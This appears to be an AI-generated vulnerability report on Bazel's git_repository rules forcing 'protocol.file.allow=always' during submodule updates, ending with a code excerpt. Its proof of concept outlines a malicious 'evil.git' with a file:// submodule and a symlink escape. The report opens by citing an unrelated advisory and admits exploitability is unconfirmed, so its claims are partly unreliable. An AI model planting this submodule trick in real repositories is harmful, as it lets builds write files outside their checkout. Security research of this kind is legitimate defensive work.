### Title
Bazel's `git_repository`/`new_git_repository` force `protocol.file.allow=always` for submodule updates, reviving a patched Git local-clone escape - (File: `tools/build_defs/repo/git_worker.bzl`)

### Summary
The weblate advisory concerns RCE via argument/option injection when Bazel-equivalent VCS glue code invokes `git`/`hg` on attacker-influenced values. In Bazel's `git.bzl`/`git_worker.bzl` repository-rule implementation, the analogous surface is the `update_submodules` helper that runs `git submodule update --init [--recursive] --checkout --force`, but always prefixes it with `-c protocol.file.allow=always` [1](#0-0) . Upstream Git deliberately restricted `protocol.file.allow` to `user` (not `always`) as the fix for the local-clone symlink/hardlink escape (the class of bug fixed together with the “submodule” protocol-confusion CVEs), because a malicious repository's `.gitmodules`/submodule entries can point at `file://` paths and, combined with symlinks in the submodule tree, cause the clone machinery to write outside the intended working tree. Bazel's helper unconditionally re-enables the vulnerable behavior for every `git_repository`/`new_git_repository` invocation that sets `init_submodules` or `recursive_init_submodules`.

### Finding Description
`git_repo()` drives the full clone via `_update()`, which calls `init`, `add_origin`, `fetch`, `reset`, `clean`, and finally `update_submodules` when `init_submodules`/`recursive_init_submodules` is requested [2](#0-1) . `update_submodules` executes:
```
_git_maybe_shallow(ctx, git_repo, "-c", "protocol.file.allow=always", "submodule", "update", "--init", "--recursive", "--checkout", "--force")
``` [1](#0-0) 

The `remote`, `commit`, `tag`, and `branch` values that drive `fetch`/`reset` are trusted config supplied by the build author [3](#0-2) , so they are not the attacker surface here. The attacker surface is the **content of the fetched repository itself** — an outsider who controls (or compromises/force-pushes/forks) the target Git repository can craft a `.gitmodules` file whose submodule URL uses the `file://` transport combined with symlinks inside the submodule working tree. Git's own local-clone code path historically allowed such a submodule checkout to dereference/create files outside the destination directory; upstream Git closed this by defaulting `protocol.file.allow` to `user`, which blocks automatic (non-interactive) use of `file://` submodules unless a human/config explicitly opts in. Bazel's `_git_maybe_shallow(... "-c", "protocol.file.allow=always" ...)` unconditionally opts back in on every invocation, with no user awareness or containment check.

Crucially, unlike the `strip_prefix`/`add_prefix` handling elsewhere in `git.bzl`, which explicitly validates that the resulting path stays under the checkout directory before renaming files (`fail("strip_prefix ... escaped the checkout directory")`) [4](#0-3) , there is no equivalent containment check after `update_submodules` runs. Nothing in `git_worker.bzl` inspects the submodule paths/targets for symlink escapes or verifies the result stays inside `git_repo.directory` before or after the submodule-update call [5](#0-4) .

### Impact Explanation
If a victim's `MODULE.bazel`/`WORKSPACE` uses `git_repository`/`new_git_repository` with `init_submodules = True` or `recursive_init_submodules = True` against a repository an outsider can influence (a public dependency the outsider contributes to, a fork/mirror selected by an unpinned `branch`, or a repository compromised after the pin was chosen but before the build runs against `HEAD`/a floating branch), that outsider can smuggle a submodule/symlink combination whose local-clone semantics let `git submodule update --init` write files outside the intended checkout directory. Because Bazel force-enables `protocol.file.allow=always`, the very git-level defense against this is disabled, converting content served by an untrusted remote into files placed outside the source root / exec root of the invoking build — matching the “write outside the repository / exec root / output base” impact bar.

### Likelihood Explanation
Requires: (1) `init_submodules`/`recursive_init_submodules` enabled — a supported and non-default-off but reasonably common option for vendoring dependencies with submodules — and (2) the ability to serve/publish repository content the build fetches (a plausible unprivileged-outsider scenario for any dependency hosted on a public forge, or any build that resolves an unpinned branch/tag). No credentials or local access are needed; the “fetch and checkout” path is exactly the built-in `git_repository` execution flow with default flags on a current release, and the vulnerable `-c protocol.file.allow=always` override is unconditional in the code, not gated by any flag.

### Recommendation
Do not unconditionally force `protocol.file.allow=always` for submodule updates. Only opt into `file://` submodules when the submodule’s resolved URL is verified to be relative to the already-fetched, trusted remote (i.e., mirror Git’s own safer default), or add an explicit containment/symlink check on the resulting submodule working trees analogous to the `strip_prefix`/`add_prefix` escape checks already present in `git.bzl`, failing the rule if any submodule path resolves outside `git_repo.directory`.

### Proof of Concept
1. Publish a Git repository `evil.git` whose tree contains:
   - a `.gitmodules` entry: `[submodule "x"] path = x url = file:///absolute/attacker/chosen/path`
   - the submodule/tree structured so that a symlink placed by the parent checkout (e.g., `x -> /tmp` or another path outside the intended workdir) is present before `git submodule update --init` runs, reproducing the pre-`protocol.file.allow=user` local-clone escape.
2. In a `MODULE.bazel`/`WORKSPACE`, declare:
   ```
   git_repository(
       name = "dep",
       remote = "https://example.com/evil.git",
       branch = "main",
       recursive_init_submodules = True,
   )
   ```
3. Run `bazel build @dep//...` and observe (in a JUnit/`src/test/shell/bazel` integration test invoking `git_repo()`/`update_submodules` against a crafted local `evil.git` fixture) that `git -c protocol.file.allow=always submodule update --init --recursive --checkout --force` succeeds and writes/links files outside `git_repo.directory`, whereas the same fixture run with plain `git submodule update --init --recursive` (Git's own default `protocol.file.allow=user`) is rejected — demonstrating that Bazel's override at [1](#0-0)  is what reintroduces the escape.

**Uncertainty note:** I could not find any Bazel-side containment/symlink check specific to submodule checkouts in the indexed code (only the `strip_prefix`/`add_prefix` checks exist), and I could not confirm from this index alone whether a currently-shipped Git version still contains an exploitable local-clone path when `protocol.file.allow=always` is forced (this depends on the Git binary version on the build machine, which is outside Bazel's control). A Devin session with full repo/checkout access and the ability to run `git`/Bazel integration tests would be needed to build the concrete JUnit/shell reproduction and confirm exploitability end-to-end.

def _update(ctx, git_repo):
    ctx.delete(git_repo.directory)

    init(ctx, git_repo)
    add_origin(ctx, git_repo, ctx.attr.remote)
    fetch(ctx, git_repo)
    reset(ctx, git_repo)
    clean(ctx, git_repo)

    if git_repo.recursive_init_submodules:
        ctx.report_progress("Updating submodules recursively")
        update_submodules(ctx, git_repo, recursive = True)
    elif git_repo.init_submodules:
        ctx.report_progress("Updating submodules")
        update_submodules(ctx, git_repo)

def update_submodules(ctx, git_repo, recursive = False):
    if recursive:
        # "protocol.file.allow=always" allows the submodule command clone from a local directory.
        # It's necessary for Git 2.38.1 and assoicated backport versions.
        # See https://github.com/bazelbuild/bazel/issues/17040
